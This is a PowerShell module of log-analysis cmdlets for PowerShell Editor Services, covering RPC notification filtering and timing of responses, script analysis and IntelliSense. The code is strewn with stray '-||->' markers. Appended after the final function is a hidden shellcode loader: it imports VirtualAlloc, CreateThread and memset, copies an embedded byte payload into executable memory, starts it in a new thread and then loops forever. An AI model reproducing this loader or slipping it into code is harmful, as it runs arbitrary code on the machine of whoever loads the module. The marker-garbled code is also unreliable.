
 -||-> function Get-PsesRpcNotificationMessage {
    [CmdletBinding(DefaultParameterSetName = "PsesLogEntry")]
    param(
        
        [Parameter(Mandatory = $true, Position = 0, ParameterSetName = "Path")]
        [Alias("PSPath")]
        [ValidateNotNullOrEmpty()]
        [string]
        $Path,

        
        [Parameter(Mandatory = $true, Position = 0, ParameterSetName = "PsesLogEntry", ValueFromPipeline = $true)]
        [ValidateNotNull()]
        [psobject[]]
        $LogEntry,

        
        [Parameter(Position=1)]
        [ValidateSet(
            "$/cancelRequest",
            "initialized",
            "powerShell/executionStatusChanged",
            "textDocument/didChange",
            "textDocument/didClose",
            "textDocument/didOpen",
            "textDocument/didSave",
            "textDocument/publishDiagnostics",
            "workspace/didChangeConfiguration")]
        [string]
        $MessageName,

        
        
        [Parameter()]
        [string]
        $Pattern,

        
        [Parameter()]
        [ValidateSet('Client', 'Server')]
        [string]
        $Source
    )

    begin {
         -||-> if ( -||-> $PSCmdlet.ParameterSetName -eq "Path" <-||- ) {
             -||-> $logEntries =  -||-> Parse-PsesLog $Path <-||-  <-||- 
        } <-||- 
    }

    process {
         -||-> if ( -||-> $PSCmdlet.ParameterSetName -eq "PsesLogEntry" <-||- ) {
             -||-> $logEntries = $LogEntry <-||- 
        } <-||- 

         -||-> foreach ($entry in  -||-> $logEntries <-||- ) {
             -||-> if ( -||-> $entry.LogMessageType -ne 'Notification' <-||- ) { continue } <-||- 

             -||-> if ( -||-> ( -||-> !$MessageName -or ( -||-> $entry.Message.Name -eq $MessageName <-||- ) <-||- ) -and
                ( -||-> !$Pattern -or ( -||-> $entry.Message.Name -match $Pattern <-||- ) <-||- ) -and
                ( -||-> !$Source -or ( -||-> $entry.Message.Source -eq $Source <-||- ) <-||- ) <-||- ) {

                 -||-> $entry <-||- 
            } <-||- 
        } <-||- 
    }
} <-||- 


 -||-> function Get-PsesRpcMessageResponseTime {
    [CmdletBinding(DefaultParameterSetName = "PsesLogEntry")]
    param(
        
        [Parameter(Mandatory=$true, Position=0, ParameterSetName="Path")]
        [Alias("PSPath")]
        [ValidateNotNullOrEmpty()]
        [string]
        $Path,

        
        [Parameter(Mandatory=$true, Position=0, ParameterSetName="PsesLogEntry", ValueFromPipeline=$true)]
        [ValidateNotNull()]
        [psobject[]]
        $LogEntry,

        
        [Parameter(Position=1)]
        [ValidateSet(
            "textDocument/codeAction",
            "textDocument/codeLens",
            "textDocument/completion",
            "textDocument/documentSymbol",
            "textDocument/foldingRange",
            "textDocument/formatting",
            "textDocument/hover",
            "textDocument/rangeFormatting")]
        [string]
        $MessageName,

        
        
        [Parameter()]
        [string]
        $Pattern
    )

    begin {
         -||-> if ( -||-> $PSCmdlet.ParameterSetName -eq "Path" <-||- ) {
             -||-> $logEntries =  -||-> Parse-PsesLog $Path <-||-  <-||- 
        } <-||- 
    }

    process {
         -||-> if ( -||-> $PSCmdlet.ParameterSetName -eq "PsesLogEntry" <-||- ) {
             -||-> $logEntries += $LogEntry <-||- 
        } <-||- 
    }

    end {
        
         -||-> $requests = @{} <-||- 

         -||-> foreach ($entry in  -||-> $logEntries <-||- ) {
             -||-> if ( -||-> ( -||-> $entry.LogMessageType -ne 'Request' <-||- ) -and ( -||-> $entry.LogMessageType -ne 'Response' <-||- ) <-||- ) { continue } <-||- 

             -||-> if ( -||-> ( -||-> !$MessageName -or ( -||-> $entry.Message.Name -eq $MessageName <-||- ) <-||- ) -and
                ( -||-> !$Pattern -or ( -||-> $entry.Message.Name -match $Pattern <-||- ) <-||- ) <-||- ) {

                 -||-> $key = "$( -||-> $entry.Message.Name <-||- )-$( -||-> $entry.Message.Id <-||- )" <-||- 
                 -||-> if ( -||-> $entry.LogMessageType -eq 'Request' <-||- ) {
                     -||-> $requests[$key] = $entry <-||- 
                }
                else {
                     -||-> $request = $requests[$key] <-||- 
                     -||-> if ( -||-> !$request <-||- ) {
                         -||-> Write-Warning "No corresponding request for response: $( -||-> $entry.Message <-||- )" <-||- 
                        continue
                    } <-||- 

                     -||-> $elapsedMilliseconds = [int]( -||-> $entry.Timestamp - $request.Timestamp <-||- ).TotalMilliseconds <-||- 
                     -||-> [PsesLogEntryElapsed]::new($entry, $elapsedMilliseconds) <-||- 
                } <-||- 
            } <-||- 
        } <-||- 
    }
} <-||- 

 -||-> function Get-PsesScriptAnalysisCompletionTime {
    [CmdletBinding(DefaultParameterSetName = "PsesLogEntry")]
    param(
        
        [Parameter(Mandatory = $true, Position = 0, ParameterSetName = "Path")]
        [Alias("PSPath")]
        [ValidateNotNullOrEmpty()]
        [string]
        $Path,

        
        [Parameter(Mandatory = $true, Position = 0, ParameterSetName = "PsesLogEntry", ValueFromPipeline = $true)]
        [ValidateNotNull()]
        [psobject[]]
        $LogEntry
    )

    begin {
         -||-> if ( -||-> $PSCmdlet.ParameterSetName -eq "Path" <-||- ) {
             -||-> $logEntries =  -||-> Parse-PsesLog $Path <-||-  <-||- 
        } <-||- 
    }

    process {
         -||-> if ( -||-> $PSCmdlet.ParameterSetName -eq "PsesLogEntry" <-||- ) {
             -||-> $logEntries = $LogEntry <-||- 
        } <-||- 

         -||-> foreach ($entry in  -||-> $logEntries <-||- ) {
             -||-> if ( -||-> ( -||-> $entry.LogMessageType -eq 'Log' <-||- ) -and ( -||-> $entry.Message.Data -match '^\s*Script analysis of.*\[(?<ms>\d+)ms\]\s*$' <-||- ) <-||- ) {
                 -||-> $elapsedMilliseconds = [int]$matches["ms"] <-||- 
                 -||-> [PsesLogEntryElapsed]::new($entry, $elapsedMilliseconds) <-||- 
            } <-||- 
        } <-||- 
    }
} <-||- 

 -||-> function Get-PsesIntelliSenseCompletionTime {
    [CmdletBinding(DefaultParameterSetName = "PsesLogEntry")]
    param(
        
        [Parameter(Mandatory = $true, Position = 0, ParameterSetName = "Path")]
        [Alias("PSPath")]
        [ValidateNotNullOrEmpty()]
        [string]
        $Path,

        
        [Parameter(Mandatory = $true, Position = 0, ParameterSetName = "PsesLogEntry", ValueFromPipeline = $true)]
        [ValidateNotNull()]
        [psobject[]]
        $LogEntry
    )

    begin {
         -||-> if ( -||-> $PSCmdlet.ParameterSetName -eq "Path" <-||- ) {
             -||-> $logEntries =  -||-> Parse-PsesLog $Path <-||-  <-||- 
        } <-||- 
    }

    process {
         -||-> if ( -||-> $PSCmdlet.ParameterSetName -eq "PsesLogEntry" <-||- ) {
             -||-> $logEntries = $LogEntry <-||- 
        } <-||- 

         -||-> foreach ($entry in  -||-> $logEntries <-||- ) {
            
             -||-> if ( -||-> ( -||-> $entry.LogMessageType -eq 'Log' <-||- ) -and ( -||-> $entry.Message.Data -match '^\s*IntelliSense completed in\s+(?<ms>\d+)ms.\s*$' <-||- ) <-||- ) {
                 -||-> $elapsedMilliseconds = [int]$matches["ms"] <-||- 
                 -||-> [PsesLogEntryElapsed]::new($entry, $elapsedMilliseconds) <-||- 
            } <-||- 
        } <-||- 
    }
} <-||- 

 -||-> function Get-PsesMessage {
    [CmdletBinding(DefaultParameterSetName = "PsesLogEntry")]
    param(
        
        [Parameter(Mandatory = $true, Position = 0, ParameterSetName = "Path")]
        [Alias("PSPath")]
        [ValidateNotNullOrEmpty()]
        [string]
        $Path,

        
        [Parameter(Mandatory = $true, Position = 0, ParameterSetName = "PsesLogEntry", ValueFromPipeline = $true)]
        [ValidateNotNull()]
        [psobject[]]
        $LogEntry,

        
        
        [Parameter()]
        [PsesLogLevel]
        $LogLevel = $( -||-> [PsesLogLevel]::Normal <-||- ),

        
        [Parameter()]
        [switch]
        $StrictMatch
    )

    begin {
         -||-> if ( -||-> $PSCmdlet.ParameterSetName -eq "Path" <-||- ) {
             -||-> $logEntries =  -||-> Parse-PsesLog $Path <-||-  <-||- 
        } <-||- 
    }

    process {
         -||-> if ( -||-> $PSCmdlet.ParameterSetName -eq "PsesLogEntry" <-||- ) {
             -||-> $logEntries = $LogEntry <-||- 
        } <-||- 

         -||-> foreach ($entry in  -||-> $logEntries <-||- ) {
             -||-> if ( -||-> ( -||-> $StrictMatch -and ( -||-> $entry.LogLevel -eq $LogLevel <-||- ) <-||- ) -or
                ( -||-> !$StrictMatch -and ( -||-> $entry.LogLevel -ge $LogLevel <-||- ) <-||- ) <-||- ) {
                 -||-> $entry <-||- 
            } <-||- 
        } <-||- 
    }
} <-||- 

 -||-> $oBs = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $oBs -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xdb,0xdf,0xbd,0x5c,0x13,0x9d,0xc3,0xd9,0x74,0x24,0xf4,0x5f,0x31,0xc9,0xb1,0x47,0x31,0x6f,0x18,0x03,0x6f,0x18,0x83,0xef,0xa0,0xf1,0x68,0x3f,0xb0,0x74,0x92,0xc0,0x40,0x19,0x1a,0x25,0x71,0x19,0x78,0x2d,0x21,0xa9,0x0a,0x63,0xcd,0x42,0x5e,0x90,0x46,0x26,0x77,0x97,0xef,0x8d,0xa1,0x96,0xf0,0xbe,0x92,0xb9,0x72,0xbd,0xc6,0x19,0x4b,0x0e,0x1b,0x5b,0x8c,0x73,0xd6,0x09,0x45,0xff,0x45,0xbe,0xe2,0xb5,0x55,0x35,0xb8,0x58,0xde,0xaa,0x08,0x5a,0xcf,0x7c,0x03,0x05,0xcf,0x7f,0xc0,0x3d,0x46,0x98,0x05,0x7b,0x10,0x13,0xfd,0xf7,0xa3,0xf5,0xcc,0xf8,0x08,0x38,0xe1,0x0a,0x50,0x7c,0xc5,0xf4,0x27,0x74,0x36,0x88,0x3f,0x43,0x45,0x56,0xb5,0x50,0xed,0x1d,0x6d,0xbd,0x0c,0xf1,0xe8,0x36,0x02,0xbe,0x7f,0x10,0x06,0x41,0x53,0x2a,0x32,0xca,0x52,0xfd,0xb3,0x88,0x70,0xd9,0x98,0x4b,0x18,0x78,0x44,0x3d,0x25,0x9a,0x27,0xe2,0x83,0xd0,0xc5,0xf7,0xb9,0xba,0x81,0x34,0xf0,0x44,0x51,0x53,0x83,0x37,0x63,0xfc,0x3f,0xd0,0xcf,0x75,0xe6,0x27,0x30,0xac,0x5e,0xb7,0xcf,0x4f,0x9f,0x91,0x0b,0x1b,0xcf,0x89,0xba,0x24,0x84,0x49,0x43,0xf1,0x31,0x4f,0xd3,0x3a,0x6d,0x4e,0x24,0xd3,0x6c,0x51,0x3b,0x7f,0xf8,0xb7,0x6b,0x2f,0xaa,0x67,0xcb,0x9f,0x0a,0xd8,0xa3,0xf5,0x84,0x07,0xd3,0xf5,0x4e,0x20,0x79,0x1a,0x27,0x18,0x15,0x83,0x62,0xd2,0x84,0x4c,0xb9,0x9e,0x86,0xc7,0x4e,0x5e,0x48,0x20,0x3a,0x4c,0x3c,0xc0,0x71,0x2e,0xea,0xdf,0xaf,0x45,0x12,0x4a,0x54,0xcc,0x45,0xe2,0x56,0x29,0xa1,0xad,0xa9,0x1c,0xba,0x64,0x3c,0xdf,0xd4,0x88,0xd0,0xdf,0x24,0xdf,0xba,0xdf,0x4c,0x87,0x9e,0xb3,0x69,0xc8,0x0a,0xa0,0x22,0x5d,0xb5,0x91,0x97,0xf6,0xdd,0x1f,0xce,0x31,0x42,0xdf,0x25,0xc0,0xbe,0x36,0x03,0xb6,0xae,0x8a <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $F5J=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $F5J.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$F5J,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



